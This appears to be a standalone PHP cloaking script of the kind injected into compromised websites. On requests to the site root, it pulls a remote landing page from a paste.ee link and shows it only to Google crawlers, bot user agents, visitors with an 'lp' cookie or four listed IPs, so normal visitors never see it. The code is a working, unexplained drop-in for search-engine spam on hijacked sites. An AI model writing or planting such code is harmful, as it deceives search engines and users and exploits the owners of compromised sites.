<?php error_reporting(0);
$link = "https://paste.ee/r/P16cPCLi/0"; // lp dalam bentuk paste raw
function ip_in_range($ip, $range)
{
    list($subnet, $bits) = explode("/", $range);
    $ip_dec = ip2long($ip);
    $subnet_dec = ip2long($subnet);
    $mask = -1 << 32 - $bits;
    $subnet_dec &= $mask;
    return ($ip_dec & $mask) === $subnet_dec;
}
function fetch_ip_ranges($url, $ipv4_key)
{
    $json_data = file_get_contents($url);
    if ($json_data === false) {
        die("Error: Could not fetch the IP ranges from $url.");
    }
    $ip_data = json_decode($json_data, true);
    $ip_ranges = [];
    if (isset($ip_data["prefixes"])) {
        foreach ($ip_data["prefixes"] as $prefix) {
            if (isset($prefix[$ipv4_key])) {
                $ip_ranges[] = $prefix[$ipv4_key];
            }
        }
    }
    return $ip_ranges;
}
$google_ip_ranges = fetch_ip_ranges(
    "https://www.gstatic.com/ipranges/goog.json",
    "ipv4Prefix"
);
$visitor_ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"])
    ? $_SERVER["HTTP_CF_CONNECTING_IP"]
    : (isset($_SERVER["HTTP_INCAP_CLIENT_IP"])
        ? $_SERVER["HTTP_INCAP_CLIENT_IP"]
        : (isset($_SERVER["HTTP_TRUE_CLIENT_IP"])
            ? $_SERVER["HTTP_TRUE_CLIENT_IP"]
            : (isset($_SERVER["HTTP_REMOTEIP"])
                ? $_SERVER["HTTP_REMOTEIP"]
                : (isset($_SERVER["HTTP_X_REAL_IP"])
                    ? $_SERVER["HTTP_X_REAL_IP"]
                    : $_SERVER["REMOTE_ADDR"]))));
$googleallow = false;
foreach ($google_ip_ranges as $range) {
    if (ip_in_range($visitor_ip, $range)) {
        $googleallow = true;
        break;
    }
}
$asd = ["bot", "ahrefs", "google"];
foreach ($asd as $len) {
    $nul = $len;
}
$alow = ["85.92.66.150", "81.19.188.236", "81.19.188.235", "85.92.66.149"];
if ($_SERVER["REQUEST_URI"] == "/") {
    $agent = strtolower($_SERVER["HTTP_USER_AGENT"]);
    if (
        strpos($agent, $nul) or
        $googleallow or
        isset($_COOKIE["lp"]) or
        in_array($visitor_ip, $alow)
    ) {
        echo implode("", file($link));
        die();
    }
} ?>
